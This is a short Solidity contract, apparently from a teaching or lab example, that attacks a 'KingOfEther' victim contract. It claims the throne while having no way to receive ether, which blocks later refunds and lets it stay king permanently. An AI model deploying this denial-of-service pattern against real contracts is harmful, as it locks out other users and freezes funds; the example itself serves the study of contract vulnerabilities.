// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./Victim.sol";

contract KingOfEtherAttacker {
    KingOfEther kingOfEther;

    constructor(address _kingOfEther) {
        kingOfEther = KingOfEther(_kingOfEther);
    }

    function attack() public payable {
        kingOfEther.claimThrone{value: msg.value}();
    }
}
